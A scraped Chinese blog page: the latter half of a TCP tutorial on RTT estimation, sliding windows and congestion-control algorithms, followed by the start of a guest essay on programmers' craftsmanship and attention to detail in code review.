WestWood算法](https://coolshell.cn/articles/11609.html#TCP_WestWood算法)[其它](https://coolshell.cn/articles/11609.html#其它)[ 后记](https://coolshell.cn/articles/11609.html#_后记)

#### TCP的RTT算法

从前面的TCP重传机制我们知道Timeout的设置对于重传非常重要。

- 设长了，重发就慢，丢了老半天才重发，没有效率，性能差；
- 设短了，会导致可能并没有丢就重发。于是重发的就快，会增加网络拥塞，导致更多的超时，更多的超时导致更多的重发。

而且，这个超时时间在不同的网络的情况下，根本没有办法设置一个死的值。只能动态地设置。 为了动态地设置，TCP引入了RTT——Round Trip Time，也就是一个数据包从发出去到回来的时间。这样发送端就大约知道需要多少的时间，从而可以方便地设置Timeout——RTO（Retransmission TimeOut），以让我们的重传机制更高效。 听起来似乎很简单，好像就是在发送端发包时记下t0，然后接收端再把这个ack回来时再记一个t1，于是RTT = t1 – t0。没那么简单，这只是一个采样，不能代表普遍情况。



##### 经典算法

[RFC793](http://tools.ietf.org/html/rfc793) 中定义的经典算法是这样的：

1）首先，先采样RTT，记下最近好几次的RTT值。

2）然后做平滑计算SRTT（ Smoothed RTT）。公式为：（其中的 α 取值在0.8 到 0.9之间，这个算法英文叫Exponential weighted moving average，中文叫：加权移动平均）

**SRTT = ( α \* SRTT ) + ((1- α) \* RTT)**

3）开始计算RTO。公式如下：

**RTO = min [ UBOUND,  max [ LBOUND,  (β \* SRTT) ]  ]**

其中：

- UBOUND是最大的timeout时间，上限值
- LBOUND是最小的timeout时间，下限值
- β 值一般在1.3到2.0之间。

##### Karn / Partridge 算法

但是上面的这个算法在重传的时候会出有一个终极问题——你是用第一次发数据的时间和ack回来的时间做RTT样本值，还是用重传的时间和ACK回来的时间做RTT样本值？

这个问题无论你选那头都是按下葫芦起了瓢。 如下图所示：

- 情况（a）是ack没回来，所以重传。如果你计算第一次发送和ACK的时间，那么，明显算大了。
- 情况（b）是ack回来慢了，但是导致了重传，但刚重传不一会儿，之前ACK就回来了。如果你是算重传的时间和ACK回来的时间的差，就会算短了。

![img](photo/Karn-Partridge-Algorithm.jpg)

所以1987年的时候，搞了一个叫[Karn / Partridge Algorithm](https://en.wikipedia.org/wiki/Karn's_Algorithm)，这个算法的最大特点是——**忽略重传，不把重传的RTT做采样**（你看，你不需要去解决不存在的问题）。

但是，这样一来，又会引发一个大BUG——**如果在某一时间，网络闪动，突然变慢了，产生了比较大的延时，这个延时导致要重转所有的包（因为之前的RTO很小），于是，因为重转的不算，所以，RTO就不会被更新，这是一个灾难**。 于是Karn算法用了一个取巧的方式——只要一发生重传，就对现有的RTO值翻倍（这就是所谓的 Exponential backoff），很明显，这种死规矩对于一个需要估计比较准确的RTT也不靠谱。

##### Jacobson / Karels 算法

前面两种算法用的都是“加权移动平均”，这种方法最大的毛病就是如果RTT有一个大的波动的话，很难被发现，因为被平滑掉了。所以，1988年，又有人推出来了一个新的算法，这个算法叫Jacobson / Karels Algorithm（参看[RFC6289](http://tools.ietf.org/html/rfc6298)）。这个算法引入了最新的RTT的采样和平滑过的SRTT的差距做因子来计算。 公式如下：（其中的DevRTT是Deviation RTT的意思）

**SRTT** **= S****RTT** **+ α** **(****RTT** **– S****RTT****)**  —— 计算平滑RTT

**DevRTT** **= (1-β****)\*****DevRTT** **+ β*****(|****RTT-SRTT****|)** ——计算平滑RTT和真实的差距（加权移动平均）

**RTO= µ \* SRTT + ∂ \*DevRTT** —— 神一样的公式

（其中：在Linux下，α = 0.125，β = 0.25， μ = 1，∂ = 4 ——这就是算法中的“调得一手好参数”，nobody knows why, it just works…） 最后的这个算法在被用在今天的TCP协议中（Linux的源代码在：[tcp_rtt_estimator](http://lxr.free-electrons.com/source/net/ipv4/tcp_input.c?v=2.6.32#L609)）。

#### TCP滑动窗口

需要说明一下，如果你不了解TCP的滑动窗口这个事，你等于不了解TCP协议。我们都知道，**TCP必需要解决的可靠传输以及包乱序（reordering）的问题**，所以，TCP必需要知道网络实际的数据处理带宽或是数据处理速度，这样才不会引起网络拥塞，导致丢包。

所以，TCP引入了一些技术和设计来做网络流控，Sliding Window是其中一个技术。 前面我们说过，**TCP头里有一个字段叫Window，又叫Advertised-Window，这个字段是接收端告诉发送端自己还有多少缓冲区可以接收数据**。**于是发送端就可以根据这个接收端的处理能力来发送数据，而不会导致接收端处理不过来**。 为了说明滑动窗口，我们需要先看一下TCP缓冲区的一些数据结构：

![img](photo/sliding_window.jpg)

上图中，我们可以看到：

- 接收端LastByteRead指向了TCP缓冲区中读到的位置，NextByteExpected指向的地方是收到的连续包的最后一个位置，LastByteRcved指向的是收到的包的最后一个位置，我们可以看到中间有些数据还没有到达，所以有数据空白区。

- 发送端的LastByteAcked指向了被接收端Ack过的位置（表示成功发送确认），LastByteSent表示发出去了，但还没有收到成功确认的Ack，LastByteWritten指向的是上层应用正在写的地方。

于是：

- 接收端在给发送端回ACK中会汇报自己的AdvertisedWindow = MaxRcvBuffer – LastByteRcvd – 1;

- 而发送方会根据这个窗口来控制发送数据的大小，以保证接收方可以处理。

下面我们来看一下发送方的滑动窗口示意图：

![img](photo/tcpswwindows.png)

（[图片来源](http://www.tcpipguide.com/free/t_TCPSlidingWindowAcknowledgmentSystemForDataTranspo-6.htm)）

上图中分成了四个部分，分别是：（其中那个黑模型就是滑动窗口）

- \#1已收到ack确认的数据。
- \#2发还没收到ack的。
- \#3在窗口中还没有发出的（接收方还有空间）。
- \#4窗口以外的数据（接收方没空间）

下面是个滑动后的示意图（收到36的ack，并发出了46-51的字节）：

![img](photo/tcpswslide.png)

下面我们来看一个接受端控制发送端的图示：

![img](photo/tcpswflow.png)

（[图片来源](http://www.tcpipguide.com/free/t_TCPWindowSizeAdjustmentandFlowControl-2.htm)）

##### Zero Window

上图，我们可以看到一个处理缓慢的Server（接收端）是怎么把Client（发送端）的TCP Sliding Window给降成0的。此时，你一定会问，如果Window变成0了，TCP会怎么样？是不是发送端就不发数据了？是的，发送端就不发数据了，你可以想像成“Window Closed”，那你一定还会问，如果发送端不发数据了，接收方一会儿Window size 可用了，怎么通知发送端呢？

解决这个问题，TCP使用了Zero Window Probe技术，缩写为ZWP，也就是说，发送端在窗口变成0后，会发ZWP的包给接收方，让接收方来ack他的Window尺寸，一般这个值会设置成3次，第次大约30-60秒（不同的实现可能会不一样）。如果3次过后还是0的话，有的TCP实现就会发RST把链接断了。

**注意**：只要有等待的地方都可能出现DDoS攻击，Zero Window也不例外，一些攻击者会在和HTTP建好链发完GET请求后，就把Window设置为0，然后服务端就只能等待进行ZWP，于是攻击者会并发大量的这样的请求，把服务器端的资源耗尽。（关于这方面的攻击，大家可以移步看一下[Wikipedia的SockStress词条](https://en.wikipedia.org/wiki/Sockstress)）

另外，Wireshark中，你可以使用tcp.analysis.zero_window来过滤包，然后使用右键菜单里的follow TCP stream，你可以看到ZeroWindowProbe及ZeroWindowProbeAck的包。

##### Silly Window Syndrome

Silly Window Syndrome翻译成中文就是“糊涂窗口综合症”。正如你上面看到的一样，如果我们的接收方太忙了，来不及取走Receive Windows里的数据，那么，就会导致发送方越来越小。到最后，如果接收方腾出几个字节并告诉发送方现在有几个字节的window，而我们的发送方会义无反顾地发送这几个字节。

要知道，我们的TCP+IP头有40个字节，为了几个字节，要达上这么大的开销，这太不经济了。

另外，你需要知道网络上有个MTU，对于以太网来说，MTU是1500字节，除去TCP+IP头的40个字节，真正的数据传输可以有1460，这就是所谓的MSS（Max Segment Size）注意，TCP的RFC定义这个MSS的默认值是536，这是因为 [RFC 791](http://tools.ietf.org/html/rfc791)里说了任何一个IP设备都得最少接收576尺寸的大小（实际上来说576是拨号的网络的MTU，而576减去IP头的20个字节就是536）。

**如果你的网络包可以塞满MTU，那么你可以用满整个带宽，如果不能，那么你就会浪费带宽**。（大于MTU的包有两种结局，一种是直接被丢了，另一种是会被重新分块打包发送） 你可以想像成一个MTU就相当于一个飞机的最多可以装的人，如果这飞机里满载的话，带宽最高，如果一个飞机只运一个人的话，无疑成本增加了，也而相当二。

所以，**Silly Windows Syndrome这个现像就像是你本来可以坐200人的飞机里只做了一两个人**。 要解决这个问题也不难，就是避免对小的window size做出响应，直到有足够大的window size再响应，这个思路可以同时实现在sender和receiver两端。

- 如果这个问题是由Receiver端引起的，那么就会使用 David D Clark’s 方案。在receiver端，如果收到的数据导致window size小于某个值，可以直接ack(0)回sender，这样就把window给关闭了，也阻止了sender再发数据过来，等到receiver端处理了一些数据后windows size 大于等于了MSS，或者，receiver buffer有一半为空，就可以把window打开让send 发送数据过来。

- 如果这个问题是由Sender端引起的，那么就会使用著名的 [Nagle’s algorithm](https://en.wikipedia.org/wiki/Nagle's_algorithm)。这个算法的思路也是延时处理，他有两个主要的条件：1）要等到 Window Size>=MSS 或是 Data Size >=MSS，2）收到之前发送数据的ack回包，他才会发数据，否则就是在攒数据。

另外，Nagle算法默认是打开的，所以，对于一些需要小包场景的程序——**比如像telnet或ssh这样的交互性比较强的程序，你需要关闭这个算法**。你可以在Socket设置TCP_NODELAY选项来关闭这个算法（关闭Nagle算法没有全局参数，需要根据每个应用自己的特点来关闭）



setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (**char** *)&value,sizeof(**int**));



另外，网上有些文章说TCP_CORK的socket option是也关闭Nagle算法，这不对。**TCP_CORK其实是更新激进的Nagle算汉，完全禁止小包发送，而Nagle算法没有禁止小包发送，只是禁止了大量的小包发送**。最好不要两个选项都设置。

#### TCP的拥塞处理 – Congestion Handling

上面我们知道了，TCP通过Sliding Window来做流控（Flow Control），但是TCP觉得这还不够，因为Sliding Window需要依赖于连接的发送端和接收端，其并不知道网络中间发生了什么。TCP的设计者觉得，一个伟大而牛逼的协议仅仅做到流控并不够，因为流控只是网络模型4层以上的事，TCP的还应该更聪明地知道整个网络上的事。

具体一点，我们知道TCP通过一个timer采样了RTT并计算RTO，但是，**如果网络上的延时突然增加，那么，TCP对这个事做出的应对只有重传数据，但是，重传会导致网络的负担更重，于是会导致更大的延迟以及更多的丢包，于是，这个情况就会进入恶性循环被不断地放大。试想一下，如果一个网络内有成千上万的TCP连接都这么行事，那么马上就会形成“网络风暴”，TCP这个协议就会拖垮整个网络。**这是一个灾难。

所以，TCP不能忽略网络上发生的事情，而无脑地一个劲地重发数据，对网络造成更大的伤害。对此TCP的设计理念是：**TCP不是一个自私的协议，当拥塞发生的时候，要做自我牺牲。就像交通阻塞一样，每个车都应该把路让出来，而不要再去抢路了。**

关于拥塞控制的论文请参看《[Congestion Avoidance and Control](http://ee.lbl.gov/papers/congavoid.pdf)》(PDF)

拥塞控制主要是四个算法：**1）慢启动**，**2）拥塞避免**，**3）拥塞发生**，**4）快速恢复**。这四个算法不是一天都搞出来的，这个四算法的发展经历了很多时间，到今天都还在优化中。 备注:

- 1988年，TCP-Tahoe 提出了1）慢启动，2）拥塞避免，3）拥塞发生时的快速重传
- 1990年，TCP Reno 在Tahoe的基础上增加了4）快速恢复

##### 慢热启动算法 – Slow Start

首先，我们来看一下TCP的慢热启动。慢启动的意思是，刚刚加入网络的连接，一点一点地提速，不要一上来就像那些特权车一样霸道地把路占满。新同学上高速还是要慢一点，不要把已经在高速上的秩序给搞乱了。

慢启动的算法如下(cwnd全称Congestion Window)：

1）连接建好的开始先初始化cwnd = 1，表明可以传一个MSS大小的数据。

2）每当收到一个ACK，cwnd++; 呈线性上升

3）每当过了一个RTT，cwnd = cwnd*2; 呈指数让升

4）还有一个ssthresh（slow start threshold），是一个上限，当cwnd >= ssthresh时，就会进入“拥塞避免算法”（后面会说这个算法）

所以，我们可以看到，如果网速很快的话，ACK也会返回得快，RTT也会短，那么，这个慢启动就一点也不慢。下图说明了这个过程。

![img](photo/tcp.slow_.start_.jpg)

这里，我需要提一下的是一篇Google的论文《[An Argument for Increasing TCP’s Initial Congestion Window](https://static.googleusercontent.com/media/research.google.com/zh-CN//pubs/archive/36640.pdf)》Linux 3.0后采用了这篇论文的建议——把cwnd 初始化成了 10个MSS。 而Linux 3.0以前，比如2.6，Linux采用了[RFC3390](http://www.rfc-editor.org/rfc/rfc3390.txt)，cwnd是跟MSS的值来变的，如果MSS< 1095，则cwnd = 4；如果MSS>2190，则cwnd=2；其它情况下，则是3。

#####  拥塞避免算法 – Congestion Avoidance

前面说过，还有一个ssthresh（slow start threshold），是一个上限，当cwnd >= ssthresh时，就会进入“拥塞避免算法”。一般来说ssthresh的值是65535，单位是字节，当cwnd达到这个值时后，算法如下：

1）收到一个ACK时，cwnd = cwnd + 1/cwnd

2）当每过一个RTT时，cwnd = cwnd + 1

这样就可以避免增长过快导致网络拥塞，慢慢的增加调整到网络的最佳值。很明显，是一个线性上升的算法。

##### 拥塞状态时的算法

前面我们说过，当丢包的时候，会有两种情况：

1）等到RTO超时，重传数据包。TCP认为这种情况太糟糕，反应也很强烈。

- - sshthresh =  cwnd /2
  - cwnd 重置为 1
  - 进入慢启动过程

2）Fast Retransmit算法，也就是在收到3个duplicate ACK时就开启重传，而不用等到RTO超时。

- - TCP Tahoe的实现和RTO超时一样。

- - TCP Reno的实现是：
    - cwnd = cwnd /2
    - sshthresh = cwnd
    - 进入快速恢复算法——Fast Recovery

上面我们可以看到RTO超时后，sshthresh会变成cwnd的一半，这意味着，如果cwnd<=sshthresh时出现的丢包，那么TCP的sshthresh就会减了一半，然后等cwnd又很快地以指数级增涨爬到这个地方时，就会成慢慢的线性增涨。我们可以看到，TCP是怎么通过这种强烈地震荡快速而小心得找到网站流量的平衡点的。

##### 快速恢复算法 – Fast Recovery

**TCP Reno**

这个算法定义在[RFC5681](http://tools.ietf.org/html/rfc5681)。快速重传和快速恢复算法一般同时使用。快速恢复算法是认为，你还有3个Duplicated Acks说明网络也不那么糟糕，所以没有必要像RTO超时那么强烈。 注意，正如前面所说，进入Fast Recovery之前，cwnd 和 sshthresh已被更新：

- cwnd = cwnd /2
- sshthresh = cwnd

然后，真正的Fast Recovery算法如下：

- cwnd = sshthresh  + 3 * MSS （3的意思是确认有3个数据包被收到了）
- 重传Duplicated ACKs指定的数据包
- 如果再收到 duplicated Acks，那么cwnd = cwnd +1
- 如果收到了新的Ack，那么，cwnd = sshthresh ，然后就进入了拥塞避免的算法了。

如果你仔细思考一下上面的这个算法，你就会知道，**上面这个算法也有问题，那就是——它依赖于3个重复的Acks**。注意，3个重复的Acks并不代表只丢了一个数据包，很有可能是丢了好多包。但这个算法只会重传一个，而剩下的那些包只能等到RTO超时，于是，进入了恶梦模式——超时一个窗口就减半一下，多个超时会超成TCP的传输速度呈级数下降，而且也不会触发Fast Recovery算法了。

通常来说，正如我们前面所说的，SACK或D-SACK的方法可以让Fast Recovery或Sender在做决定时更聪明一些，但是并不是所有的TCP的实现都支持SACK（SACK需要两端都支持），所以，需要一个没有SACK的解决方案。而通过SACK进行拥塞控制的算法是FACK（后面会讲）

**TCP New Reno**

于是，1995年，TCP New Reno（参见 [RFC 6582](http://tools.ietf.org/html/rfc6582) ）算法提出来，主要就是在没有SACK的支持下改进Fast Recovery算法的——

- 当sender这边收到了3个Duplicated Acks，进入Fast Retransimit模式，开发重传重复Acks指示的那个包。如果只有这一个包丢了，那么，重传这个包后回来的Ack会把整个已经被sender传输出去的数据ack回来。如果没有的话，说明有多个包丢了。我们叫这个ACK为Partial ACK。

- 一旦Sender这边发现了Partial ACK出现，那么，sender就可以推理出来有多个包被丢了，于是乎继续重传sliding window里未被ack的第一个包。直到再也收不到了Partial Ack，才真正结束Fast Recovery这个过程

我们可以看到，这个“Fast Recovery的变更”是一个非常激进的玩法，他同时延长了Fast Retransmit和Fast Recovery的过程。

##### 算法示意图

下面我们来看一个简单的图示以同时看一下上面的各种算法的样子：

![img](photo/tcp.fr_-1024x359.jpg)

 

##### FACK算法

FACK全称Forward Acknowledgment 算法，论文地址在这里（PDF）[Forward Acknowledgement: Refining TCP Congestion Control](http://conferences.sigcomm.org/sigcomm/1996/papers/mathis.pdf) 这个算法是其于SACK的，前面我们说过SACK是使用了TCP扩展字段Ack了有哪些数据收到，哪些数据没有收到，他比Fast Retransmit的3 个duplicated acks好处在于，前者只知道有包丢了，不知道是一个还是多个，而SACK可以准确的知道有哪些包丢了。 所以，SACK可以让发送端这边在重传过程中，把那些丢掉的包重传，而不是一个一个的传，但这样的一来，如果重传的包数据比较多的话，又会导致本来就很忙的网络就更忙了。所以，FACK用来做重传过程中的拥塞流控。

- 这个算法会把SACK中最大的Sequence Number 保存在**snd.fack**这个变量中，snd.fack的更新由ack带秋，如果网络一切安好则和snd.una一样（snd.una就是还没有收到ack的地方，也就是前面sliding window里的category #2的第一个地方）

- 然后定义一个**awnd = snd.nxt – snd.fack**（snd.nxt指向发送端sliding window中正在要被发送的地方——前面sliding windows图示的category#3第一个位置），这样awnd的意思就是在网络上的数据。（所谓awnd意为：actual quantity of data outstanding in the network）

- 如果需要重传数据，那么，**awnd = snd.nxt – snd.fack + retran_data**，也就是说，awnd是传出去的数据 + 重传的数据。

- 然后触发Fast Recovery 的条件是： ( **( snd.fack – snd.una ) > (3\*MSS)** ) || (dupacks == 3) ) 。这样一来，就不需要等到3个duplicated acks才重传，而是只要sack中的最大的一个数据和ack的数据比较长了（3个MSS），那就触发重传。在整个重传过程中cwnd不变。直到当第一次丢包的snd.nxt<=snd.una（也就是重传的数据都被确认了），然后进来拥塞避免机制——cwnd线性上涨。

我们可以看到如果没有FACK在，那么在丢包比较多的情况下，原来保守的算法会低估了需要使用的window的大小，而需要几个RTT的时间才会完成恢复，而FACK会比较激进地来干这事。 但是，FACK如果在一个网络包会被 reordering的网络里会有很大的问题。

#### 其它拥塞控制算法简介

##### **TCP Vegas 拥塞控制算法**

这个算法1994年被提出，它主要对TCP Reno 做了些修改。这个算法通过对RTT的非常重的监控来计算一个基准RTT。然后通过这个基准RTT来估计当前的网络实际带宽，如果实际带宽比我们的期望的带宽要小或是要多的活，那么就开始线性地减少或增加cwnd的大小。如果这个计算出来的RTT大于了Timeout后，那么，不等ack超时就直接重传。（Vegas 的核心思想是用RTT的值来影响拥塞窗口，而不是通过丢包） 这个算法的论文是《[TCP Vegas: End to End Congestion Avoidance on a Global Internet](http://www.cs.cmu.edu/~srini/15-744/F02/readings/BP95.pdf)》这篇论文给了Vegas和 New Reno的对比：

![img](photo/tcp_vegas_newreno-1024x555.jpg)

关于这个算法实现，你可以参看Linux源码：[/net/ipv4/tcp_vegas.h](http://lxr.free-electrons.com/source/net/ipv4/tcp_vegas.h)， [/net/ipv4/tcp_vegas.c](http://lxr.free-electrons.com/source/net/ipv4/tcp_vegas.c)

##### 

##### HSTCP(High Speed TCP) 算法

这个算法来自[RFC 3649](http://tools.ietf.org/html/rfc3649)（[Wikipedia词条](https://en.wikipedia.org/wiki/HSTCP)）。其对最基础的算法进行了更改，他使得Congestion Window涨得快，减得慢。其中：

- 拥塞避免时的窗口增长方式： cwnd = cwnd + α(cwnd) / cwnd
- 丢包后窗口下降方式：cwnd = (1- β(cwnd))*cwnd

注：α(cwnd)和β(cwnd)都是函数，如果你要让他们和标准的TCP一样，那么让α(cwnd)=1，β(cwnd)=0.5就可以了。 对于α(cwnd)和β(cwnd)的值是个动态的变换的东西。 关于这个算法的实现，你可以参看Linux源码：[/net/ipv4/tcp_highspeed.c](http://lxr.free-electrons.com/source/net/ipv4/tcp_highspeed.c)

#####  TCP BIC 算法

2004年，产内出BIC算法。现在你还可以查得到相关的新闻《Google：[美科学家研发BIC-TCP协议 速度是DSL六千倍](https://www.google.com/search?lr=lang_zh-CN|lang_zh-TW&newwindow=1&biw=1366&bih=597&tbs=lr%3Alang_1zh-CN|lang_1zh-TW&q=美科学家研发BIC-TCP协议+速度是DSL六千倍&oq=美科学家研发BIC-TCP协议+速度是DSL六千倍)》 BIC全称[Binary Increase Congestion control](http://research.csc.ncsu.edu/netsrv/?q=content/bic-and-cubic)，在Linux 2.6.8中是默认拥塞控制算法。BIC的发明者发这么多的拥塞控制算法都在努力找一个合适的cwnd – Congestion Window，而且BIC-TCP的提出者们看穿了事情的本质，其实这就是一个搜索的过程，所以BIC这个算法主要用的是Binary Search——二分查找来干这个事。 关于这个算法实现，你可以参看Linux源码：[/net/ipv4/tcp_bic.c](http://lxr.free-electrons.com/source/net/ipv4/tcp_bic.c)

##### TCP WestWood算法

westwood采用和Reno相同的慢启动算法、拥塞避免算法。westwood的主要改进方面：在发送端做带宽估计，当探测到丢包时，根据带宽值来设置拥塞窗口、慢启动阈值。 那么，这个算法是怎么测量带宽的？每个RTT时间，会测量一次带宽，测量带宽的公式很简单，就是这段RTT内成功被ack了多少字节。因为，这个带宽和用RTT计算RTO一样，也是需要从每个样本来平滑到一个值的——也是用一个加权移平均的公式。 另外，我们知道，如果一个网络的带宽是每秒可以发送X个字节，而RTT是一个数据发出去后确认需要的时候，所以，X * RTT应该是我们缓冲区大小。所以，在这个算法中，ssthresh的值就是est_BD * min-RTT(最小的RTT值)，如果丢包是Duplicated ACKs引起的，那么如果cwnd > ssthresh，则 cwin = ssthresh。如果是RTO引起的，cwnd = 1，进入慢启动。  关于这个算法实现，你可以参看Linux源码： [/net/ipv4/tcp_westwood.c](http://lxr.free-electrons.com/source/net/ipv4/tcp_westwood.c)

##### 其它

更多的算法，你可以从Wikipedia的 [TCP Congestion Avoidance Algorithm](https://en.wikipedia.org/wiki/TCP_congestion-avoidance_algorithm) 词条中找到相关的线索

####  后记

好了，到这里我想可以结束了，TCP发展到今天，里面的东西可以写上好几本书。本文主要目的，还是把你带入这些古典的基础技术和知识中，希望本文能让你了解TCP，更希望本文能让你开始有学习这些基础或底层知识的兴趣和信心。

当然，TCP东西太多了，不同的人可能有不同的理解，而且本文可能也会有一些荒谬之言甚至错误，还希望得到您的反馈和批评。

（全文完）

# 「我只是认真」聊聊工匠情怀

#####  [2014年05月26日 ](https://coolshell.cn/articles/11629.html) [王 晨纯](https://coolshell.cn/articles/author/hesey) 评论 [78 条评论](https://coolshell.cn/articles/11629.html#comments) 74,368 人阅读

**（感谢网友 [@Hesey小纯纯](http://weibo.com/tbmujian) 投稿 [博客](http://blog.hesey.net/) |　[原文链接](http://blog.hesey.net/2014/05/im-just-conscientious-talking-about-feelings-of-artisans.html)）**

老罗的Smartisan T1手机发布会很多人应该都看了，发布会的最后老罗凝视着自己的工匠自画像，半晌没说话，随后转过身，慢慢离开舞台，屏幕下方只留下一句话：

**我不是为了输赢，我就是认真。**

这一瞬间让我想起93年「狮城舌战」的主角蒋昌建，在「人性本善还是人性本恶」的总结陈词最后，以顾城的名句，「黑夜给了我黑色的眼睛，我却用它寻找光明」，把整个辩论赛的氛围推向高潮。

而老罗的这句话，和这句话背后的工匠背景，却以另外一种**无声的却震人心魄的力量**，敲打着每一个在场的，或是观看着整个发布会的观众的心绪。

「工匠情怀」，我深有体会，就像我在 [面向GC的Java编程](http://blog.hesey.net/2014/05/gc-oriented-java-programming.html) 一文中所提到的：

**优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著。**

**如果我们可以一次把事情做对，并且做好，在允许的范围内尽可能追求卓越，为什么不去做呢？**

追求卓越，追求完美，追求细节的极致。小时候看到那些修表匠，握着一个小螺丝刀，或是看着电工，用烙铁沾着锡和松香，在那一小寸的世界里，把坏了的地方修好，那种专注的眼神，觉得很厉害。

现在再去回想那些工匠工作的场景，越发觉得钦佩。在我老家有一家刻章的店，在我上幼儿园的时候就已经在那开了很多年了。前段时间需要刻一个章，发现那家店还在，于是走进去，门口坐着一个老人，我确实记不得当年是不是他，不过看这岁数八九不离十。我以前在别的地方刻的章，都是在电脑里设计完图案后，激光刻蚀。但那次老人却是用的手刻，我着实惊呆了。只看他拿出一块红色的印底，右手持着刻刀，开始一下一下地刻着。虽然老人连话都不怎么说得清了，但是工作时那专注的神情，和精湛的手艺，以及最后成品那比机器更完美的效果，着实让我心里非常动容。



目录



[一、技术人的执着](https://coolshell.cn/articles/11629.html#一、技术人的执着)[二、拾起初衷](https://coolshell.cn/articles/11629.html#二、拾起初衷)[三、发现更好的自己](https://coolshell.cn/articles/11629.html#三、发现更好的自己)[四、细节是魔鬼](https://coolshell.cn/articles/11629.html#四、细节是魔鬼)

#### 一、技术人的执着

我见过很多人，也见过很多程序员，都有如此的「工匠情怀」。

做产品需求评审，有的人善于快速提供技术解决方案，在最短的时间内解决问题。

但我见过的很多牛人，他们除了能在脑海里最快地形成方案原型，并且更深入地考虑各种细节点，最终能给出一个更趋于完善的技术方案。

在他们身上，我看到了**对这项职业的自我尊重，对自我价值的追求，也有对「卓越」的理解和渴求**。

《精通正则表达式》的译者余晟老师写过他和正则表达式的 [缘起](http://www.luanxiang.org/blog/archives/1717.html) 。只是因为项目经理让他「多用Google，查查正则表达式的资料」，余老师打开了正则的大门，读完了英文原版的《Mastering Regular Expression》，如今成为了国内最了解正则表达式的人之一。

看完那篇文章其实我想起了我的实习经历。那时候我刚去公司两三天，有一天我老板找我让我研究一下如何用Java里的MappedByteBuffer做文件内存映射来读取大文件。尽管我们当时要处理的文件很大，以我在学校编码的经验看，用普通的Reader也是可以很好地解决的。

于是我说，「这个其实用Reader也能做，更简单一些，没那么麻烦。」

老板反问我，「什么叫没那么麻烦，这是一个做技术的人的态度吗？」

那几天我花了很多时间，去从Linux一直到JVM，去了解什么是内存映射，底层原理是什么，和其它技术的比较、优缺点，并和其它几种读文件的技术做了性能对比。

虽然最后项目没有采用这个方案，但是那句反问直到现在一直在我脑海里，时时地提醒我：「**做技术的人，对待技术，应该拥有什么样的态度？**」

所以其实我很感谢我的老板，以前他教我们这些新人优秀的职场习惯，有一条是每天的邮件必须没有未读数，即便是不需要阅读的邮件，也要一键置为已读，不要留一个未读的数字在那。现在想起来，有点像iOS App右上角那个提醒数的角标，有些强迫症的人怎么也忍受不了有个红圈圈在那。开个玩笑，虽然有些习惯看起来可有可无，无关紧要，但这确实映射了一种态度和思维习惯。

**完美有多远？我不知道，但我愿意多往前走一步。**

#### 二、拾起初衷

我们的生活，每天很忙碌。有时候忙得自己都忘记了为什么在此处，有时候忙得只能不断地用直觉、用以往的经验去设计一个解决方案，而没有时间去思考需求是不是合理，方案是不是最佳，我们以为自己设计的是最佳实践，谁知道呢？

这个社会，这个世界，处在一个以不可思议的速度向前直奔的时间线上，我们处在这个时代的浪潮之上，每个人都感到了那种令人窒息的紧迫感。

父母都是不希望孩子太累的，我们见过很多这样的话：

**差不多就行了。**

**糊弄糊弄就完事了。**

**不要与众不同。**

**顺其自然。**

但是你应该问问自己，是不是真的要 [顺其自然](http://blog.hesey.net/2010/05/is-let-it-be-consolation-or-excuse.html) ？

我记得在上大二的时候，听一个叫端木恒的人说过一句话，大意是，**这个世界上，政治可以改变很多事情，而科技，可以通过促进信息的流通，最终去推动政治的变革，去改变整个世界。**

当时觉得这事儿太酷了，是的，所以我当时的想法是，要去一个技术足够强大，并且对人们的生活有实质影响的公司。希望用技术的力量去让更多人生活地更好。

这当然是一种不自量力，但又如何呢？只是一个普通人小小的想法，不断追求卓越，愿意比别人多往前走一步而已。

就像冯大辉说的：

**所有人都说你做不成，都告诉你不要去做，不靠谱，嘲讽你，而你最后真的把事情做起来了，这就是牛逼。**

做成了，其实牛不牛逼对你自己而言已经不重要了。

没做成，所有人都笑你是傻逼，但起码也对得起自己的内心。

再说，如果 [青年人](http://blog.hesey.net/2010/05/strength-of-the-young.html) 想的都是养老和退休，那做事的人在哪？

#### 三、发现更好的自己

老罗最后的一个问题是：

**在一个完美主义者的眼里，这是一个怎样的世界？**

这个社会上很多人在生活上追求更高的品质，但愿意对自己手头所做的事情坚持高标准坚持卓越理念的人已经不多见了，以至于我们发现**花再多的钱也买不到安全的食品了，花了一辈子的积蓄买的房子却有各种质量问题。**扪心自问自己在工作中是否能坚持某些东西，大部分人的态度都差不多，只是你糊弄一下不会怎样，而他马虎一点就会死人，区别仅仅在于这里。

M·斯科特·派克说过一句话：

**规避问题和逃避问题的趋向，是人类心理疾病的根源。**

很多人把随大流把妥协作为一种「成熟」的标志，小时候敢想敢说可能也敢做，长大以后懂得了人情世故，懂得向现实妥协，45度角仰望天空说自己终于长大了。再看身边那些「冥顽不灵」、「认死理」的所谓完美主义者，认为这些人才是不正常的群体，把这些人要么当做傻逼要么当做装逼。

天哪，我都想问，「这是一个怎样的世界？」

肯定有人会说，站着说话不腰疼。诚然，在生活中，有的人是为了活下去，有的人是为了活得更好，有的人是为了帮助别人活得更好。这是不同的人生阶段，每个人的情况不一样，但这并不影响每个人内心的精神寄托和对信念的追求。

我从不指望去改变别人，但我相信我可以改变自己，虽然也很难。

学生都喜欢问，如何最快地告诉自己的能力。说实话，我真的不知道什么是捷径，我的经验就是和比你优秀的人一起工作，经常请教比你资深的人，不断挑战过去的自己（每天审视自己太紧张了，只要比前段时间的自己更好就可以了）。

#### 四、细节是魔鬼

Devils are in the details，细节是魔鬼，这句话很多人都听过，但要在工作中时时刻刻注意？难。

前几天给同事做Code Review，就几行代码，发现了一个问题。

场景是我们发现某个系统中存在占用内存超大的HTML字符串，需要统计HTML字符串的长度，于是为了获得准确的字节长度，这段代码调用的是String.getBytes().length，一眼看起来并没有什么大问题。

但是考虑到本身这个字符串就比较大，联想到Java内部是用UTF-16存储字符串的，而getBytes()会转换为系统默认编码（GBK或是UTF-8等等），这里必然存在底层字符数组的拷贝（可以去参考String.getBytes()的源代码证实），一个本身就很大的字符串，经过拷贝，将会占用更多的内存，加剧这个问题，而在HTML中，中文其实只占了非常小的一部分，所以直接用String.length()，虽然会少数几个字符，但对统计结果影响其实并不大，并且这里不存在任何数组分配的开销。

另外建议所有调用String.getBytes()的地方通通显式传入编码，这是个大坑。（*陈皓注：用String.length代替getBytes().length，也是在给未来挖坑——如果未来有人要用len来干别的事，那么这个不精确的len可能就是一个大坑*）

另外一个案例，也是在Code Review的时候发现的。

